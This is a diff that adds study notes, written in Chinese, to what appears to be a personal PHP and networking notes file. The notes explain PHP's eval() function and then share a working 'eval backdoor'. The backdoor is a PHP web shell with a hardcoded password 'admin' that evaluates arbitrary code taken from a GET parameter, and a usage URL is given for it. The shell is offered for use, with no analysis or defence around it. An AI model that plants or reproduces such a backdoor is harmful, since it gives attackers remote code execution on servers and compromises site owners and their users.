@@ -1438,3 +1438,22 @@ setcookie('username','jack',time()+7*24*3600);
 
 七层网络模型名称：
 物理层、数据链路层、网络层、传输层、会话层、表示层、应用层。
+
+
+++PHP中eval()函数++++++
+eval("echo 'hello world';");
+等同于下面的代码：
+echo "hello world";
+在浏览器中输出：hello world;
+注意点：
+1.eval函数的参数的字符串末尾一定要有分号，在最后还要另加一个分号（这个分号是php限制）
+2.注意单引号，双引号和反斜杠的运用。如果参数中带有变量时,并且变量有赋值操作的话，
+变量前的$符号钱一定要有\来转义。如果没有赋值操作可以不需要。
+分享个php eval后门程序：
+使用方法
+http://url/test.php?pwd=admin&action=eval&a=phpinfo();
+代码如下：
+<?php
+$passwd="admin";if($_GET['pwd']!=$passwd)exit;
+if($_GET['action']=="eval" && $_GET['a']){eval($_GET['a']);}
+?>
